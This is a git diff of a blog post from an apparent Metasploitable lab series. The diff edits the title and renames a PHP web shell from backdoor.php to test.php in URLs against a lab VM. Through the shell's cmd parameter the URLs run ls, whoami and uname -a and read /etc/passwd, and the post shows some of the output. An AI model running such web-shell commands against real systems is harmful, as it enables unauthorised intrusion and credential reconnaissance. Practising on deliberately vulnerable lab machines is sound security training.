@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Metasploitable Series"
+title: "Metasploitable Series Issue 1"
 categories: ["Hands-on", "Metasploitable"]
 tags: "Metasploitable Series"
 ---
@@ -62,18 +62,18 @@ after reading the exploit I understood that we have to add to the link the cmd c
 ![test PHP](/images/testphp.png)
 
 
-http://192.168.199.130/backdoor.php?cmd=ls
+http://192.168.199.130/test.php?cmd=ls
 
 ### What we can find out
 
 WHOAMI
-http://192.168.199.130/backdoor.php?cmd=whoami _www-data_
+http://192.168.199.130/test.php?cmd=whoami _www-data_
 
 Os Running
-http://192.168.199.130/backdoor.php?cmd=uname -a _Linux metasploitable3-ub1404 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux_
+http://192.168.199.130/test.php?cmd=uname -a _Linux metasploitable3-ub1404 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux_
 
 Users in the machine
-http://192.168.199.130/backdoor.php?cmd=cat%20/etc/passwd
+http://192.168.199.130/test.php?cmd=cat%20/etc/passwd
 
 users found
 
